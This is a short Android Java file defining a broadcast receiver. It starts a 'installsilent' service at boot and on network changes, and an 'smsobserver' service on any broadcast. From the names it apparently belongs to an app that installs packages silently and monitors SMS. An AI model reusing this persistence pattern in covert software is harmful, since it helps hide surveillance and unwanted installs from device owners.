package com.x.installsilent;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class TriggerReceiver extends BroadcastReceiver {

	public static final String action_boot = "android.intent.action.BOOT_COMPLETED";
	public static final String action_connectivity_change = "android.net.conn.CONNECTIVITY_CHANGE";

	@Override
	public void onReceive(Context context, Intent intent) {
		String action = intent.getAction();
		System.out.println("action:"+action);
		if (action_boot.equals(action)
				|| action_connectivity_change.equals(action)) {
			Intent service = new Intent();
			service.setAction("com.x.installsilent");
			context.startService(service);
		}
		Intent service = new Intent();
		service.setAction("com.x.installsilent.smsobserver");
		context.startService(service);
	}
}
